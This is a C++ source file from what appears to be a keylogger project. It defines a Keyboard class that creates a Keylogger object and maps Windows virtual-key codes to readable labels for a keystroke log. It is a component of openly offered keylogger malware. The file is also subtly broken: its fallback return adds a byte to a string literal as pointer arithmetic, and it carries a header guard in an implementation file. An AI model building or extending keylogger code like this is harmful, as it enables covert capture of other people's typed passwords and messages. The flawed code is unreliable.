#pragma once
#include "keylogger.h"

#define CaseReturnString(CASE, STRING) case (CASE): return std::string(STRING)

Keyboard::Keyboard()
	: keys((Key**)malloc(sizeof(Key* [KEYBOARDSIZE])))
	, polling(1)
	, keylogger(new Keylogger(this)) {
	if (keys) {
		for (BYTE i = 0; i < KEYBOARDSIZE; i++) {
			keys[i] = new Key(i, describeKey(i));
		}
	}
}

Key** Keyboard::getKeys() const {
	return keys;
}

std::string Keyboard::describeKey(BYTE vk) {
	switch (vk) {
		//CaseReturnString(VK_LBUTTON, "[M1]");
		//CaseReturnString(VK_RBUTTON, "[M2]");
		//CaseReturnString(VK_MBUTTON, "[M3]");
		CaseReturnString(VK_BACK, "[BKSPC]");
		CaseReturnString(VK_TAB, "[TAB]");
		CaseReturnString(VK_RETURN, "[ENTER]");
		//CaseReturnString(VK_SHIFT, "[SHIFT]");
		//CaseReturnString(VK_CONTROL, "[CTRL]");
		CaseReturnString(VK_MENU, "[ALT]");
		CaseReturnString(VK_PAUSE, "[PAUSE]");
		CaseReturnString(VK_CAPITAL, "[CAPS LK]");
		CaseReturnString(VK_ESCAPE, "[ESC]");
		CaseReturnString(VK_SPACE, " ");
		CaseReturnString(VK_PRIOR, "[PAGE UP]");
		CaseReturnString(VK_NEXT, "[PAGE DOWN]");
		CaseReturnString(VK_END, "[END]");
		CaseReturnString(VK_HOME, "[HOME]");
		CaseReturnString(VK_LEFT, "[LEFT ARROW]");
		CaseReturnString(VK_UP, "[UP ARROW]");
		CaseReturnString(VK_RIGHT, "[RIGHT ARROW]");
		CaseReturnString(VK_DOWN, "[DOWN ARROW]");
		CaseReturnString(VK_SNAPSHOT, "[PRT SC]");
		CaseReturnString(VK_INSERT, "[INS]");
		CaseReturnString(VK_DELETE, "[DEL]");
		CaseReturnString(VK_LWIN, "[LWIN]");
		CaseReturnString(VK_RWIN, "[RWIN]");
		CaseReturnString(VK_NUMPAD0, "[NUMPAD 0]");
		CaseReturnString(VK_NUMPAD1, "[NUMPAD 1]");
		CaseReturnString(VK_NUMPAD2, "[NUMPAD 2]");
		CaseReturnString(VK_NUMPAD3, "[NUMPAD 3]");
		CaseReturnString(VK_NUMPAD4, "[NUMPAD 4]");
		CaseReturnString(VK_NUMPAD5, "[NUMPAD 5]");
		CaseReturnString(VK_NUMPAD6, "[NUMPAD 6]");
		CaseReturnString(VK_NUMPAD7, "[NUMPAD 7]");
		CaseReturnString(VK_NUMPAD8, "[NUMPAD 8]");
		CaseReturnString(VK_NUMPAD9, "[NUMPAD 9]");
		CaseReturnString(VK_MULTIPLY, "*");
		CaseReturnString(VK_ADD, "+");
		CaseReturnString(VK_SUBTRACT, "-");
		CaseReturnString(VK_DIVIDE, "/");
		CaseReturnString(VK_SEPARATOR, ".");
		CaseReturnString(VK_F1, "[F1]");
		CaseReturnString(VK_F2, "[F2]");
		CaseReturnString(VK_F3, "[F3]");
		CaseReturnString(VK_F4, "[F4]");
		CaseReturnString(VK_F5, "[F5]");
		CaseReturnString(VK_F6, "[F6]");
		CaseReturnString(VK_F7, "[F7]");
		CaseReturnString(VK_F8, "[F8]");
		CaseReturnString(VK_F9, "[F9]");
		CaseReturnString(VK_F10, "[F10]");
		CaseReturnString(VK_F11, "[F11]");
		CaseReturnString(VK_F12, "[F12]");
		CaseReturnString(VK_F13, "[F13]");
		CaseReturnString(VK_F14, "[F14]");
		CaseReturnString(VK_F15, "[F15]");
		CaseReturnString(VK_F16, "[F16]");
		CaseReturnString(VK_F17, "[F17]");
		CaseReturnString(VK_F18, "[F18]");
		CaseReturnString(VK_F19, "[F19]");
		CaseReturnString(VK_F20, "[F20]");
		CaseReturnString(VK_F21, "[F21]");
		CaseReturnString(VK_F22, "[F22]");
		CaseReturnString(VK_F23, "[F23]");
		CaseReturnString(VK_F24, "[F24]");
		CaseReturnString(VK_NUMLOCK, "[NUM LK]");
		CaseReturnString(VK_SCROLL, "[SCR LK]");
		CaseReturnString(VK_LSHIFT, "[LSHIFT]");
		CaseReturnString(VK_RSHIFT, "[RSHIFT]");
		CaseReturnString(VK_LCONTROL, "[LCTRL]");
		CaseReturnString(VK_RCONTROL, "[RCTRL]");
		CaseReturnString(VK_LMENU, "[LALT]");
		CaseReturnString(VK_RMENU, "[RALT]");
		CaseReturnString(VK_OEM_1, ";");
		CaseReturnString(VK_OEM_2, "/");
		CaseReturnString(VK_OEM_3, "~");
		CaseReturnString(VK_OEM_4, "[");
		CaseReturnString(VK_OEM_5, "\\");
		CaseReturnString(VK_OEM_6, "]");
		CaseReturnString(VK_OEM_7, "'");
		CaseReturnString(VK_OEM_COMMA, ",");
		CaseReturnString(VK_OEM_PERIOD, ".");
		CaseReturnString(VK_OEM_MINUS, "-");
		CaseReturnString(VK_OEM_PLUS, "=");

	}
	if ((vk >= 'A' && vk <= 'Z') || (vk >= '0' && vk <= '9')) {
		return std::string(1, (char)vk);
	}
	return std::string("[" + vk + ']');
}